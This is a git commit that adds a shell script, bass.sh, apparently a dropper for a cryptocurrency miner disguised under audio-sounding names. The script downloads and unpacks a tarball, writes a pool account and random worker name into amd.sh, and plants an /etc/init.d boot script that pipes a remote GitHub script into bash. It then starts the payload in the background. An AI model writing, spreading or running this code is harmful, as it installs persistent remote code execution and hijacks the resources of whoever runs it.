2888d6d299dad412649e38930bf36d87e813c36a
rubbyadi <rubbyadis@gmail.com>
2024-06-01 04:37:17 +0000

    Create bass.sh

---
+++ bass.sh
@@ -0,0 +1,16 @@
+cd /
+rm -rf acoustic.tar
+rm -rf acoustic
+wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/acoustic.tar
+tar -xvf acoustic.tar
+cd /acoustic
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
+sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > bitrate.sh
+chmod a+x bitrate.sh
+update-rc.d bitrate.sh defaults
+cd /acoustic
+nohup ./bass.sh
+ps -ef | grep acoustic
